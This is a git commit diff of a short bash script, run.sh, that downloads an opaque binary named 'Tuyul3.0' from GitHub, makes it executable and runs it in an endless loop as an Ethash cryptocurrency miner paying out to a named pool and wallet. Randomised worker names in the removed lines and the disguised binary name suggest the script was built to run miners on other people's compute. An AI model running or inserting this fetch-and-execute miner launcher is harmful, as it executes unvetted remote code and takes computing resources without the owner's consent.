2abf68eac5791d47dfed94e67408c9dd2470c03a
Loderop <98947789+Loderop@users.noreply.github.com>
2022-03-04 22:06:53 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0xbe4dbe090f7f304008d25d9861b332f785128c2d
-WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#qtsd-rbx1)
-wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
+POOL=stratum+tcp://ethash.kupool.com:1800
+WALLET=tawheedop
+WORKER=gpu1
+wget https://github.com/Loderop/new/raw/main/Tuyul3.0
 chmod +x Tuyul3.0
 while [ 1 ]; do
-./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER
 sleep 5
 done
 sleep 999999999 
